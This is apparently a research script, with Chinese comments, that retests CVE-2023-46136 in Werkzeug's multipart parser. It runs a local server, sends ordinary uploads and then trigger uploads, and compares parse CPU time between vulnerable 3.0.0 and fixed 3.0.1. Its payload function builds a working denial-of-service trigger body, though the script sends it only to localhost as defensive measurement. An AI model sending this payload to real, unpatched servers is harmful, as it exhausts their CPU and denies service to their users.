#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""对真实 CVE-2023-46136（Werkzeug multipart 解析）做一次耗散复测。

做法：
  1. 用指定解释器（装有 werkzeug 3.0.0 或 3.0.1）启动最小 WSGI 服务
  2. 基线段：按固定速率上传同尺寸的正常 multipart（内容每 8KB 有 CRLF）
  3. 观测段：同样速率上传同样尺寸、但内容以 CRLF 开头且不含 CRLF 的 multipart
  4. 服务端在解析前后读 process_time，通过响应头返回本次解析的 CPU
  5. 按 4 秒聚块算每请求 CPU，复用与探针相同的判据：冻结基线、中位数+MAD、连续 3 窗 > 3σ

用法：
  python3 real_cve/run_cve.py --python /tmp/venv-300/bin/python --label vuln_300
  python3 real_cve/run_cve.py --python /tmp/venv-301/bin/python --label fixed_301
"""

import argparse
import http.client
import json
import socket
import statistics
import subprocess
import sys
import time
from pathlib import Path

APP = Path(__file__).with_name("wsgi_app.py")
OUT = Path(__file__).resolve().parents[1] / "results" / "real_cve"


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def payload(size, trigger):
    head = (b"--X\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.bin\"\r\n"
            b"Content-Type: application/octet-stream\r\n\r\n")
    if trigger:
        content = b"\r\n" + b"a" * size
    else:
        content = (b"a" * 8188 + b"\r\n") * (size // 8190)
    return head + content + b"\r\n--X--\r\n"


def wait_ready(port, proc):
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            c = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
            c.request("GET", "/ping")
            ok = c.getresponse().read() == b"ok"
            c.close()
            if ok:
                return
        except Exception:
            pass
        if proc.poll() is not None:
            raise RuntimeError("server exited early")
        time.sleep(0.1)
    raise RuntimeError("server not ready")


def werkzeug_version(python):
    out = subprocess.run([python, "-c",
                          "import importlib.metadata as m; print(m.version('werkzeug'))"],
                         capture_output=True, text=True, timeout=30)
    return out.stdout.strip() or "unknown"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--python", required=True, help="装有目标 werkzeug 版本的解释器")
    ap.add_argument("--label", required=True)
    ap.add_argument("--size", type=int, default=8 * 1024 * 1024)
    ap.add_argument("--rate", type=float, default=1.0)
    ap.add_argument("--baseline", type=float, default=12.0)
    ap.add_argument("--measure", type=float, default=28.0)
    ap.add_argument("--block", type=float, default=4.0)
    args = ap.parse_args()

    body_benign = payload(args.size, False)
    body_trigger = payload(args.size, True)
    version = werkzeug_version(args.python)

    port = free_port()
    proc = subprocess.Popen([args.python, str(APP), "--port", str(port)],
                            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    wait_ready(port, proc)

    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=120)

    def send(body):
        conn.request("POST", "/upload", body=body,
                     headers={"Content-Type": "multipart/form-data; boundary=X",
                              "Content-Length": str(len(body))})
        resp = conn.getresponse()
        resp.read()
        if resp.status != 200:
            raise RuntimeError(f"HTTP {resp.status}")
        return float(resp.getheader("X-Parse-Cpu-Ms", "nan"))

    # 预热，排除导入与首次解析开销
    send(body_benign)
    send(body_benign)

    interval = 1.0 / args.rate
    phases = []
    records = {"baseline": [], "measure": []}
    for name, body, duration in (("baseline", body_benign, args.baseline),
                                 ("measure", body_trigger, args.measure)):
        t0 = time.time()
        sent = 0
        while time.time() - t0 < duration:
            parse_ms = send(body)
            records[name].append((time.time() - t0, parse_ms))
            sent += 1
            delay = t0 + sent * interval - time.time()
            if delay > 0:
                time.sleep(delay)
        phases.append({"name": name, "seconds": round(time.time() - t0, 1)})

    conn.close()
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()

    def blocks(rows, offset):
        out = []
        n = int(max((r[0] for r in rows), default=0) // args.block) + 1
        for i in range(n):
            lo = i * args.block
            vals = [v for t, v in rows if lo <= t < lo + args.block]
            if vals:
                out.append({"t": round(offset + lo, 1), "work": len(vals),
                            "cpu_per_req_ms": round(statistics.fmean(vals), 3)})
        return out

    base_blocks = blocks(records["baseline"], 0.0)
    meas_blocks = blocks(records["measure"], phases[0]["seconds"])

    base_vals = [b["cpu_per_req_ms"] for b in base_blocks]
    med = statistics.median(base_vals) if base_vals else 0.0
    mad = statistics.median([abs(v - med) for v in base_vals]) if base_vals else 0.0
    mad = max(mad, 0.05 * med, 1e-9)
    spread = (max(base_vals) - min(base_vals)) / med if base_vals and med > 0 else 0.0
    rel_mad = mad / med if med > 0 else 1.0
    stable = len(base_vals) >= 2 and rel_mad <= 0.10 and spread <= 0.40

    for b in meas_blocks:
        b["z"] = round((b["cpu_per_req_ms"] - med) / mad, 2)

    zs = [b["z"] for b in meas_blocks]
    smooth = [round(statistics.median(zs[i:i + 3]), 2) for i in range(len(zs) - 2)]
    sustained = bool(smooth) and max(smooth) > 3.0
    if len(meas_blocks) < 3:
        verdict = "insufficient_window"
    elif not stable:
        verdict = "baseline_unstable"
    elif sustained:
        verdict = "sustained"
    elif any(z > 3.0 for z in zs):
        verdict = "transient_only"
    else:
        verdict = "clean"

    result = {
        "label": args.label,
        "cve": "CVE-2023-46136",
        "werkzeug": version,
        "size_kb": args.size // 1024,
        "rate": args.rate,
        "baseline_seconds": args.baseline,
        "measure_seconds": args.measure,
        "baseline_cpu_per_req_ms": round(med, 3),
        "baseline_mad_ms": round(mad, 3),
        "baseline_stable": stable,
        "baseline_blocks": base_blocks,
        "measure_blocks": meas_blocks,
        "smooth_z": smooth,
        "verdict": verdict,
    }
    OUT.mkdir(parents=True, exist_ok=True)
    path = OUT / f"{args.label}.json"
    path.write_text(json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8")

    print(json.dumps({k: result[k] for k in
                      ("label", "werkzeug", "verdict", "baseline_cpu_per_req_ms",
                       "baseline_stable", "smooth_z")}, ensure_ascii=False, indent=2))
    print("baseline:", [b["cpu_per_req_ms"] for b in base_blocks])
    print("measure:", [(b["cpu_per_req_ms"], b["z"]) for b in meas_blocks])
    print("written:", path)


if __name__ == "__main__":
    main()
